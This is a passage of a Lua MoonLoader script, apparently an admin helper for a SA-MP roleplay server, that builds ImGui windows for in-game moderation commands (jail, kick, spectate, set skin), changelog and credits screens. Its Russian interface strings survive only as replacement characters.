    os.execute(('explorer.exe "%s"'):format("https://vk.com/nikeveryone"))
end
			imgui.NewLine()
			imgui.Separator()
			imgui.Text(u8'����� ���� �������: ')
			imgui.SameLine()
			imgui.PushItemWidth(150)
			if imgui.Combo('##theme', other.tema, items) then
				cfg.settings.theme = other.tema.v
				inicfg.save(cfg, cfgConfig)
			end
		end
		if selected == 12 then
			imgui.TextColoredRGB('{D2691E}������ {ffffff}����������� ����� {ffdead}��������.')
		imgui.TextColoredRGB('{D2691E}������ {ffffff}������� ��� ������ �������� �� ������.')
		imgui.Separator()
		imgui.CenterTextColoredRGB('1 {ffdead}�����{ffdead}:')
		imgui.TextColoredRGB('{FF7F50}�������{ffffff}: ��� ���� ������� ����������� "{FFA500}/arep{ffffff}".')
		imgui.TextColoredRGB('��� ��������, ���������� ���� ������� ����� �������.')
		if doesFileExist("moonloader/Lovler FReport Helper.luac") then else
		imgui.Separator()
		imgui.CenterTextColoredRGB('��� �������� ������ �� ��������� �������, ����� �������� -')
	imgui.SetCursorPosX(150)
		if imgui.Button('Nik Everyone | Flin-RP 02') then
				os.execute("explorer \"http://vk.com/nikeveryone\"")
			end
			
			end
			imgui.Separator()
		if doesFileExist("moonloader/Lovler FReport Helper.luac") then
			imgui.CenterTextColoredRGB('������� ���������: "{FFA500}/lovl1{ffffff}"')
			else
		imgui.CenterTextColoredRGB('������� ���������: {FF0000}BLOCKED')
		end
		imgui.Text(u8'                                         ')
		imgui.SameLine()
		imgui.TextColoredRGB('{FF7F50}������{ffffff}:')
		imgui.SameLine()
		if lovl then
		    		imgui.TextColored(imgui.ImVec4(0.00, 0.53, 0.76, 1.00), u8'��������')
		    	else
				if doesFileExist("moonloader/Lovler FReport Helper.luac") then
				imgui.TextDisabled(u8'����������')
			
else
imgui.TextDisabled(u8'BLOCKED')

end
		    		
		    	end
				imgui.Separator()
				
			imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{f44f36}����� ������������ ����� 2 ������') imgui.PopFont()
		    			imgui.Separator()
						imgui.CenterTextColoredRGB('2 {ffdead}�����{ffffff}:')
		imgui.TextColoredRGB('{FF7F50}�������{ffffff}: ��� ���� ������� � ������� - �� ������.')
		imgui.TextColoredRGB('��� ��������, ���������� ���� ������� ����� �������.')
		if doesFileExist("moonloader/Lovler FReport Helper.luac") then else
		imgui.Separator()
		imgui.CenterTextColoredRGB('��� �������� ������ �� ��������� �������, ����� �������� -')
	imgui.SetCursorPosX(150)
		if imgui.Button('Nik Everyone | Flin-RP 02') then
				os.execute("explorer \"http://vk.com/nikeveryone\"")
			end
			end
			imgui.Separator()
			if doesFileExist("moonloader/Lovler FReport Helper.luac") then
			imgui.CenterTextColoredRGB('������� ���������: "{FFA500}/lovl2{ffffff}"')
			else
		imgui.CenterTextColoredRGB('������� ���������: {FF0000}BLOCKED')
		end
		imgui.Text(u8'                                         ')
		imgui.SameLine()
		imgui.TextColoredRGB('{FF7F50}������{ffffff}:')
		imgui.SameLine()
		if areport then
		    		imgui.TextColored(imgui.ImVec4(0.00, 0.53, 0.76, 1.00), u8'��������')
		    	else
				if doesFileExist("moonloader/Lovler FReport Helper.luac") then
				imgui.TextDisabled(u8'����������')
			
else
imgui.TextDisabled(u8'BLOCKED')

end
		    		
					
		    	end
						
		    	imgui.Separator()
		end
		if selected == 2 then
			imgui.CenterTextColoredRGB('�������� �������:')
			imgui.CenterTextColoredRGB('{FFDEAD}FReport Helper {ffffff}- ��� ������������������� � ����������� ������,')
			imgui.CenterTextColoredRGB('����� ������� �������� ���������� ������')
			imgui.CenterTextColoredRGB('��� ������������� {ffdead}Flin RP{ffffff} � ����� �������� � ���������.')
			imgui.Separator()
			imgui.CenterTextColoredRGB('����� �������: {32CD32}N.Everyone')
			imgui.CenterTextColoredRGB('�� ���� �������� ���������� � VK - ')
			imgui.SetCursorPosX(210)
			if imgui.Button('Nik Everyone') then
				os.execute("explorer \"http://vk.com/nikeveryone\"")
				end
			imgui.Separator()
			imgui.CenterTextColoredRGB('� {FFDEAD}FReport Helper {ffffff}���������� {FF7F50}������� {ffffff}�� ������� ImGui ���� ')
			imgui.CenterTextColoredRGB('� �������� {FFFF00}��������{ffffff}/{FF0000}�����������.')
			imgui.CenterTextColoredRGB('��������� �������� ���� ImGui ���������� ����� ���� ��� �� ')
			imgui.CenterTextColoredRGB('���������� ��������� {FF7F50}������{ffffff}.')
			imgui.CenterTextColoredRGB('� ���� ImGui ���� ��������������� GPS/���.���� ��/ /mn.')
			imgui.CenterTextColoredRGB('�� ������ ������ ������� � {FF7F50}�������� {ffffff}������� �� ������� "{FF7F50}�������{ffffff}".')
			imgui.CenterTextColoredRGB('����� �� ������ ������ ��������� {FF7F50}������� {ffffff}����� {FFDEAD}NUMPAD5{ffffff}.')
			imgui.CenterTextColoredRGB('����� ����� � ����� �� ������� � ����� �� {FF7538}���(������ ������ ����)')
			imgui.CenterTextColoredRGB('��������� ������� ImGui ���� ��� ������� ������')
			imgui.CenterTextColoredRGB('{FF0000}��������� {ffffff}� {32CD32}�������������� {ffffff}� �������.')
			imgui.CenterTextColoredRGB('����� � ����� �� ������� � ����� �� {FF7538}SPACE(������)')
			imgui.CenterTextColoredRGB('��������� ������� ImGui ���� ��� ������� �������������� � �������.')
			
			imgui.CenterTextColoredRGB('� {FFDEAD}FReport Helper {ffffff}��� �������� {D2691E}������ ��������{ffffff},')
			imgui.CenterTextColoredRGB('{32CD32}������������ {ffffff}������� �� ������� "��������� �������".')
			imgui.CenterTextColoredRGB('{D2691E}������ {ffffff}����������� ����� {ffdead}��������.')
			--imgui.CenterTextColoredRGB('� ������� �� �����������.')
			imgui.Separator()
			--imgui.Text(u8"\n")
			imgui.CenterTextColoredRGB('� ����� ������� ��� ������ ������ ����� ������� ��� �')
			imgui.CenterTextColoredRGB('����������� ����� ������������.')
			--imgui.Text(u8"\n")
			
			
			imgui.CenterTextColoredRGB('� ������� �� {32CD32}���� ��������{ffffff}.')
			
			
	  end
		if selected == 3 then
		imgui.CenterTextColoredRGB('������� ������: {f44f36}2.2 {ffffff}| {4682B4}ORIGINAL EDITION')
			imgui.Separator()
			imgui.CenterTextColoredRGB('����������� �������: {32CD32}Nik_Everyone')
			imgui.Separator()
			imgui.CenterTextColoredRGB('���� ������ �������: {FF4500}15.02.2022')
			imgui.CenterTextColoredRGB('���� ������ ������ {f44f36}2.0{ffffff}: {FF4500}16.04.2022')
			imgui.CenterTextColoredRGB('���� ������ ������ {f44f36}2.1{ffffff}: {FF4500}13.05.2022')
			imgui.CenterTextColoredRGB('���� ������ ������ {f44f36}2.2{ffffff}: {FF4500}24.05.2022')
			imgui.CenterTextColoredRGB('���� ������ ������ {f44f36}2.3{ffffff}: {FF4500}25.08.2022')
			imgui.Separator()
			imgui.NewLine()
			imgui.CenterTextColoredRGB('���������� �� �����������:')
			imgui.NewLine()
			imgui.Separator()
			imgui.CenterTextColoredRGB('�� ������ {ffdead}FReport Helper {FFD700}2.3 {ffffff}[{32CD32}NEW{ffffff}]:')
			imgui.NewLine()
			imgui.TextColoredRGB('{228B22}��������� {FFA500}������� ����{ffffff}.')
			imgui.TextColoredRGB('{228B22}������� {ffffff}������ ������� {ffdead}Premium{ffffff}.')
			imgui.TextColoredRGB('{228B22}�������� {ffffff}��������������� /mn � �������.')
		imgui.TextColoredRGB('� ���� {FF7F50}�������{ffffff}, ���� {228B22}��������� {ffffff}����� {FFFF00}������{ffffff}.')
		imgui.TextColoredRGB('���� {228B22}��������� {ffffff}������� ���������������� {FFFF00}������� {ffffff}� {FF7F50}�������{ffffff}.')
		imgui.TextColoredRGB("� ���� {FF7F50}�������{ffffff}, ���� {228B22}��������� {ffffff}���� ������ LVL'�� ��� �������� �����.")
			imgui.Separator()
		
			imgui.CenterTextColoredRGB('�� ������ {ffdead}FReport Helper {FFD700}2.2 {ffffff}:')
			imgui.NewLine()
			
			imgui.TextColoredRGB('{228B22}��������� {FFA500}������� ����{ffffff}.')
			imgui.TextColoredRGB('{228B22}��������� {4682B4}������ ���� {ffffff}� {FF7F50}������ {ffffff}��� {FFA500}������� �������� {ffffff}� �������.')
			imgui.TextColoredRGB('�� ������� {32CD32}������ ADM{ffffff} {228B22}���������� {ffffff}���� {FFA500}������� �������� {ffffff}� {FF7F50}������{ffffff}...')
			imgui.TextColoredRGB('...� ����� � {4682B4}������ ���� {ffffff}� ������ ��� {FFA500}������� �������� {ffffff}� �������')
			imgui.TextColoredRGB('{228B22}��������� {ffffff}����� {FFFF00}�������������� {ffffff}� {FF7F50}������{ffffff}/{FF7F50}�������{ffffff}.')
			imgui.Separator()
			imgui.CenterTextColoredRGB('�� ������ {ffdead}FReport Helper {FFD700}2.1 {ffffff}:')
			imgui.NewLine()
			imgui.TextColoredRGB('{228B22}��������� {FFA500}������� ����{ffffff}.')
			imgui.TextColoredRGB('{228B22}�������� {ffffff}����������� {D2691E}������ ��������{ffffff} �� 2 ������.')
			imgui.TextColoredRGB('{228B22}��������� {ffffff}������� {32CD32}������ ADM{ffffff}...')
			imgui.TextColoredRGB('...�� �� ������� {FFFF00}������{ffffff} � {FF0000}��������� {ffffff}� {FF7F50}�������{ffffff}.')
			imgui.Separator()
			imgui.CenterTextColoredRGB('�� ������ {ffdead}FReport Helper {FFD700}2.0{ffffff} :')
			
			imgui.NewLine()
			imgui.TextColoredRGB('{228B22}��������� {FFA500}������� ����{ffffff}.')
			imgui.TextColoredRGB('{228B22}�������� {D2691E}������ ��������{ffffff}, ��� ����� ������������ �� {FFA500}������� ����{ffffff}.')
			imgui.TextColoredRGB('� ���� {FF7F50}�������{ffffff}, ���� {228B22}��������� {ffffff}����� {FFFF00}��������������{ffffff}/{FF0000}���������{ffffff}.')
			imgui.TextColoredRGB('{ffffff}� {FFA500}���� ������� �������� {ffffff}� ������ ���� {228B22}���������')
			imgui.TextColoredRGB('����� {32CD32}��������������{ffffff}/{FF0000}���������{ffffff}.')
			imgui.TextColoredRGB('� {FFA500}���� ������� �������� {ffffff}� ������ ���� {228B22}��������� {FFA500}���� ��� {32CD32}ADM 1LVL{ffffff}.')
			imgui.NewLine()
			imgui.Separator()
		--imgui.SetCursorPosY(280)
			imgui.CenterTextColoredRGB("{00FFFF}All the Best is Ahead, don't give up, everything will work out")
		end
		if selected == 4 then 
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022') imgui.PopFont()
		imgui.Separator()
		imgui.CenterTextColoredRGB('���������� �� ������� ������:')
		imgui.Separator()
		imgui.TextColoredRGB('{FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022 {ffffff}��� ��������/������')
		imgui.SameLine()
		if imgui.Button(u8'���� ��������') then
				os.execute("explorer \"http://vk.com/nikeveryone\"")
				end
				imgui.Separator()
				imgui.CenterTextColoredRGB("������ ��������� - @nikeveryone - ������������, ����������� ��.")
				imgui.CenterTextColoredRGB("��������� ������ - @see_rose - ����������� ��.")
				imgui.CenterTextColoredRGB("���� ������� - @artyonveqilyan - ����������� ��.")
				imgui.CenterTextColoredRGB("������ ������ - @karuch15 - ��.�������������, ��������.")
				imgui.CenterTextColoredRGB("������ ��������� - @cnorix - �������������.")
				imgui.CenterTextColoredRGB("��������� ������� - @nulina00000 - ��.���������, ��������.")
				imgui.CenterTextColoredRGB("���� ���������� - @saske_reevess - ��������.")
			--	imgui.CenterTextColoredRGB("������ ������ - @whiskascc - ��������.")
				imgui.Separator()
		imgui.TextColoredRGB('� ������ �������� {FFFF00}��������� {FFFF00}��������������� {FFA500}������� {ffffff}���...')
		imgui.TextColoredRGB('...��������� {32CD32}�����������������{ffffff}.')
		imgui.TextColoredRGB('� ������� {32CD32}��� ������� {ffffff}���������� ��������� {FFA500}�������{ffffff}...')
		imgui.TextColoredRGB('...��� {00FFFF}������� �������{ffffff}.')
		imgui.TextColoredRGB('��� {FFA500}������� {FFFF00}����������� {ffffff}��� ������� {FFA500}Flin RP{ffffff},')
		imgui.TextColoredRGB('�� ������ ���� � {ffffff}��� ����������� ������,')
		imgui.TextColoredRGB('��� ������ ������� {FFA500}������� {FF0000}�� ����� {00FFFF}������� {ffffff}� {FFA500}Flin RP{ffffff}.')
		imgui.Separator()
		imgui.TextColoredRGB('���� �� ������ {FFFF00}������� {ffffff}�������� ����� {FFA500}�������...')
		imgui.TextColoredRGB('...��� �� ������� ����� � {FFA500}��������{ffffff},...')
		imgui.TextColoredRGB('...�� �� ������ {FFFF00}�������� {ffffff}� ������ ��������/������� {FFA500}S U P {ffdead}� {FFA500}2022 {ffffff}.')
		imgui.TextColoredRGB('{32CD32}��� ������� ����� {FFFF00}�������� {ffffff}� ���� �������� ����� ���������, ��� ��...')
		imgui.TextColoredRGB('������� {FFFF00}���������� {ffffff}���� ����, ��� ������ {FFFF00}������� {ffffff}��������� {FFA500}����{ffffff}!')
		imgui.Text('        ')
		imgui.SameLine()
		imgui.TextColoredRGB('������ �� ������ - ')
		imgui.SameLine()
		if imgui.Button(u8'Scripts By N.Everyone | S U P � 2022') then
				os.execute("explorer \"https://vk.me/join/NrLMGVI_HhNFblFJdy0iX2UtthiXwX4frf8=")
				end
			imgui.Separator()	
imgui.NewLine()			
			imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{32CD32}All Right') imgui.PopFont()
		end
		if selected == 5 then
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('SOON...') imgui.PopFont()
		
		imgui.SetCursorPosY(370)
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022') imgui.PopFont()
		end
		imgui.EndChild()
		--imgui.CenterTextColoredRGB('{32CD32}Nik Everyone {ffffff}-- {32CD32}Nikita Prokopief      {0087FF}Time Samp       {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022')
        
		imgui.CenterTextColoredRGB('{32CD32}Nik Everyone      {ffdead}FReport Helper      {ffffff}��� ����� ��������. ����� ����������� ���� ���������.      {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022 ')
		imgui.End()
	end
	


    if not main_window_state.v and not prices_window_state.v and not gps_window_state.v then
        text_buffer.v = ""
    end

		if unjail_menu.v then
      imgui.SetNextWindowSize(imgui.ImVec2(330, 92), imgui.Cond.FirstUseEver)
      imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
      imgui.Begin(u8"��������� � ���", unjail_menu, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)

			imgui.NewInputText(u8'##UnJail', text_buffer_unjail, 310, u8"������� ������� ��� ������������ ������", 2)

			if imgui.Button(u8'���������', imgui.ImVec2(150, 22)) then
				if text_buffer_unjail.v == '' then
					sampAddChatMessage(tag..' {ffffff}�� �� ����� ������� ��� ������� ������ �� ��������a.', -1)
				else
				 if cfg.settings.lvladmin == 1 then
				 sampSendChat('/a /jail ' ..other.recon_id.. ' 0 '..u8:decode(text_buffer_unjail.v))
					unjail_menu.v = false
					else
					sampSendChat('/jail ' ..other.recon_id.. ' 0 '..u8:decode(text_buffer_unjail.v))
					unjail_menu.v = false
					end
				end
			end

			imgui.SameLine()

			if imgui.Button(u8'�������', imgui.ImVec2(150, 22)) then
				unjail_menu.v = false
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end
		
				if afkld.v then
      imgui.SetNextWindowSize(imgui.ImVec2(350, 92), imgui.Cond.FirstUseEver)
      imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
      imgui.Begin(u8"������� LD|9 afk 15+", afkld, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)

			imgui.NewInputText(u8'##afkld', text_buffer_afkld, 335, u8"�������� ��� �������� ����� (LD[fraction])/(9[fraction])", 2)

			if imgui.Button(u8'�������', imgui.ImVec2(165, 22)) then
				if text_buffer_afkld.v == '' then
					sampAddChatMessage(tag..' {ffffff}�� �� �������� ��� �������� �����.', -1)
					sampAddChatMessage(tag..' {ffffff}�������� ��� �������� ����� {ffdead}(LD[fraction]){FFFFFF}/{ffdead}(9[fraction])', -1)
				else
				 if cfg.settings.lvladmin == 1 then
				 sampSendChat('/a /kick ' ..other.recon_id.. ' afk 15+ | '..u8:decode(text_buffer_afkld.v))
				 afkld.v = false
				 else
					sampSendChat('/kick ' ..other.recon_id.. ' afk 15+ | '..u8:decode(text_buffer_afkld.v))
					afkld.v = false
					end
				end
			end
			

			imgui.SameLine()

			if imgui.Button(u8'�������', imgui.ImVec2(165, 22)) then
				afkld.v = false
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end

	if setskin.v then
      imgui.SetNextWindowSize(imgui.ImVec2(330, 92), imgui.Cond.FirstUseEver)
      imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
      imgui.Begin(u8"������ ��������� ����", setskin, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)

			imgui.NewInputText(u8'##setskin', text_buffer_setskin, 310, u8"������� id ���������� �����", 2)

			if imgui.Button(u8'������', imgui.ImVec2(150, 22)) then
				if text_buffer_setskin.v == '' then
					sampAddChatMessage(tag..' {ffffff}�� �� ����� id ���������� ����� ��� ������.', -1)
				else
				 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 or cfg.settings.lvladmin == 3 then
				 sampSendChat('/a /setskin ' ..other.recon_id.. ' '..u8:decode(text_buffer_setskin.v))
					setskin.v = false
					else
					sampSendChat('/setskin  ' ..other.recon_id.. '   '..u8:decode(text_buffer_setskin.v))
					setskin.v = false
					end
				end
			end

			imgui.SameLine()

			if imgui.Button(u8'�������', imgui.ImVec2(150, 22)) then
				setskin.v = false
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end

if backokno.v then
			imgui.ShowCursor = true
	      local x, y = ToScreen(552, 230)
        local w, h = ToScreen(638, 330)
        local m, a = ToScreen(147, 395)
       -- imgui.SetNextWindowPos(imgui.ImVec2(m, a), imgui.Cond.FirstUseEver)
	    imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(4.4, -9.3))
        imgui.SetNextWindowSize(imgui.ImVec2(87, 20), imgui.Cond.FirstUseEver)
        imgui.Begin(u8"#backokno", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoTitleBar)
      
      if imgui.Button(u8'<< BACK', imgui.ImVec2(70, 0)) then
	  
            
			 if sampIsPlayerConnected(other.recon_id - 1) then
other.recon_id = other.recon_id - 1
 sampSendChat('/re '..other.recon_id)
 -- sampSendChat('/re '..other.recon_id)
else
sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}������� �� ��� ��������, ����� �� ������.')

other.recon_id = other.recon_id - 1
 sampSendChat('/re '..other.recon_id)
end
end			

			imgui.End()
		end
		if nextokno.v then
			imgui.ShowCursor = true
		   local x, y = ToScreen(552, 230)
        local w, h = ToScreen(638, 330)
        local m, a = ToScreen(456, 395)
      
     --   imgui.SetNextWindowPos(imgui.ImVec2(m, a), imgui.Cond.FirstUseEver)
	  imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-3.4, -9.3))
        imgui.SetNextWindowSize(imgui.ImVec2(87, 20), imgui.Cond.FirstUseEver)
        imgui.Begin(u8"#nextokno", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoTitleBar)
      
       if imgui.Button(u8'NEXT >>', imgui.ImVec2(70, 0)) then
	   
			  --sampSendChat('/re '..other.recon_id)
           if sampIsPlayerConnected(other.recon_id + 1) then
other.recon_id = other.recon_id + 1
 sampSendChat('/re '..other.recon_id)
 -- sampSendChat('/re '..other.recon_id)
else
sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}������� �� ��� ��������, ����� �� ������.')

other.recon_id = other.recon_id + 1
 sampSendChat('/re '..other.recon_id)
 
end
			  
        end

			imgui.End()
		end

if okno.v then

			imgui.ShowCursor = true
			
      local x, y = ToScreen(552, 230)
        local w, h = ToScreen(638, 330)
        local m, a = ToScreen(190, 385)
    --    imgui.SetNextWindowPos(imgui.ImVec2(m, a), imgui.Cond.FirstUseEver)
	 imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, -4.2))
        imgui.SetNextWindowSize(imgui.ImVec2(563, 68), imgui.Cond.FirstUseEver)
        imgui.Begin(u8"##DownPanel", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoTitleBar)
       
		  
		   
      if imgui.Button(u8'���������', imgui.ImVec2(70, 0)) then
          if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
		sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} ��� ������� �������������� ������������.", -1)
		else
		
          sampSendChat('/ahistory '..getNick(other.recon_id):gsub('%[PC%]', ''))
			end
end			
imgui.SameLine()
        if imgui.Button(u8'/getstats', imgui.ImVec2(70, 0)) then
            sampSendChat('/getstats '..other.recon_id)
        end imgui.SameLine()
        if imgui.Button(u8'/offgetstats', imgui.ImVec2(70, 0)) then
		if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 or cfg.settings.lvladmin == 3 then
		sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} ��� ������� �������������� ������������.", -1)
		else
            sampSendChat('/offgetstats '..getNick(other.recon_id):gsub('%[PC%]', ''))
			end
        end 
		imgui.SameLine()
        if imgui.Button(u8'/slap', imgui.ImVec2(70, 0)) then
            sampSendChat('/slap '..other.recon_id)
        end imgui.SameLine()
        if imgui.Button(u8'/freeze', imgui.ImVec2(70, 0)) then
            sampSendChat('/freeze '..other.recon_id)
        end imgui.SameLine()
        if imgui.Button(u8'/unfreeze', imgui.ImVec2(70, 0)) then
            sampSendChat('/unfreeze '..other.recon_id)
        end imgui.SameLine()
        if imgui.Button(u8'����', imgui.ImVec2(70, 0)) then
             if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
		sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} ��� ������� �������������� ������������.", -1)
		else
		--nickokno = getNick(other.recon_id):gsub('%[PC%]', '')
           sampSendChat('/namestore '..getNick(other.recon_id):gsub('%[PC%]', ''))
			--sampAddChatMessage(nickokno, -1)
			 --sampSendChat(''..nickokno)
			end
        end
		--imgui.Text(u8'')
		--imgui.SameLine()
        if imgui.Button(u8'/goto', imgui.ImVec2(70, 0)) then
            lua_thread.create(function()
                sampSendChat('/reoff')
                wait(1000)
                sampSendChat('/goto '..other.recon_id)
            end)
        end	
		imgui.SameLine()
		if imgui.Button(u8'/gethere', imgui.ImVec2(70, 0)) then
            lua_thread.create(function()
  
                sampSendChat('/reoff')
                wait(1000)
                if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2  then
				 sampSendChat('/a /ptp '..other.recon_id.. ' ' ..id)
				 wait(500)
				 sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} �� ��������� ����� �� �� ������ � ���.", -1)
				 else
                sampSendChat('/gethere '..other.recon_id)
								 wait(500)
				sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} �� ��������������� ������ � ����.", -1)
				
				end
            end)
        end
		imgui.SameLine()
        if imgui.Button(u8'�� ���?', imgui.ImVec2(59, 0)) then
            sampSendChat('/ans '..other.recon_id..' �� ���? ����� � /n')
			
        end
		
         imgui.SameLine()
		 if imgui.Button(u8'������ ������', imgui.ImVec2(93, 0)) then
          okno.v = false
			  	backokno.v = false
				nextokno.v = false
        end
		imgui.SameLine()
        if imgui.Button(u8'/flip', imgui.ImVec2(59, 0)) then
               lua_thread.create(function()
  
                sampSendChat('/flip '..other.recon_id)
				  wait(500)
				  sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} �� ����������� �� ������.", -1)
				  end)
        end
		imgui.SameLine()
        
        if imgui.Button(u8'/spawn', imgui.ImVec2(70, 0)) then
           
				sampSendChat('/spawn '..other.recon_id)
			
        end imgui.SameLine()
        if imgui.Button(u8'/reoff', imgui.ImVec2(70, 0)) then
           sampSendChat('/reoff')
        end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end
		

		if statew.v then
			imgui.ShowCursor = true
		
			imgui.SetNextWindowSize(imgui.ImVec2(185, 412), imgui.Cond.FirstUseEver)
			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-1, 0.5))
			imgui.Begin(u8'Fast CMD', statew, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'��������������', imgui.ImVec2(-0.1, 38)) then
				statew9.v = true
				statew.v = false
			end
			if imgui.Button(u8'�������� � ������', imgui.ImVec2(-0.1, 38)) then
				 statew2.v = true
				 statew.v = false
			end
			if imgui.Button(u8'������������� ���', imgui.ImVec2(-0.1, 38)) then
				statew4.v = true
				statew.v = false
			end
			if imgui.Button(u8'����������� �� �������', imgui.ImVec2(-0.1, 38)) then
				statew7.v = true
				statew.v = false
			end
			if imgui.Button(u8'������ ��������������', imgui.ImVec2(-0.1, 38)) then
				statew6.v = true
				statew.v = false
			end
			if imgui.Button(u8'������������� �������', imgui.ImVec2(-0.1, 38)) then
				statew5.v = true
				statew.v = false
			end
			if imgui.Button(u8'��������� IP', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			sampSendChat('/a /getip '..other.recon_id)
			
			else
				checking_reg = true
				sampSendChat('/getip '..other.recon_id)
				
				--okno.v = false
			end
			end
			
			--[[if imgui.Button(u8'����� ��� 1 LVL', imgui.ImVec2(-0.1, 38)) then
				statew.v = false
				pstatew.v = true
			end--]]
			
			if imgui.Button(u8'������� � ��������', imgui.ImVec2(-0.1, 38)) then
				sampSendChat('/arep')
				statew.v = false
            	
			end
			if imgui.Button(u8'������� � ��������', imgui.ImVec2(-0.1, 38)) then
				sampSendChat('/srep')
				statew.v = false
            	
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022', statew)
			imgui.End()
		end

		if statew2.v then
			imgui.ShowCursor = true
		
			imgui.SetNextWindowSize(imgui.ImVec2(150, 330), imgui.Cond.FirstUseEver)
			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-1.5, 0.5))
			imgui.Begin(u8'Fast CMD(jail)', statew2, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'DeathMatch', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /jail '..other.recon_id..' 60 DeathMatch')
		   else
		   
				sampSendChat('/jail '..other.recon_id..' 60 DeathMatch')
				
			end
			end
			if imgui.Button(u8'DriveBy', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
							sampSendChat('/a /jail '..other.recon_id..' 60 DriveBy')
							else
							
				sampSendChat('/jail '..other.recon_id..' 60 DriveBy')
			end
			end
			if imgui.Button(u8'Death Match ZZ', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /jail '..other.recon_id..' 80 DeathMatch in ZZ')
			else
				sampSendChat('/jail '..other.recon_id..' 80 DeathMatch in ZZ')
			end
			end
			if imgui.Button(u8'Death Match �������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /jail '..other.recon_id..' 80 DeathMatch �������')
			else
				sampSendChat('/jail '..other.recon_id..' 80 DeathMatch �������')
			end
			end
			if imgui.Button(u8'Team Kill ����', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /jail '..other.recon_id..' 30 TeamKill')
			else
				sampSendChat('/jail '..other.recon_id..' 30 TeamKill')
			end
			end
			if imgui.Button(u8'Team Kill �������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /jail '..other.recon_id..' 60 TeamKill')
			else
				sampSendChat('/jail '..other.recon_id..' 60 TeamKill')
			end
			end
			if imgui.Button(u8'�����', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /jail '..other.recon_id..' 300 �����')
			else
				sampSendChat('/jail '..other.recon_id..' 300 �����')
			end
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end
		if statew4.v then
			imgui.ShowCursor = true
		
			imgui.SetNextWindowSize(imgui.ImVec2(160, 413), imgui.Cond.FirstUseEver)
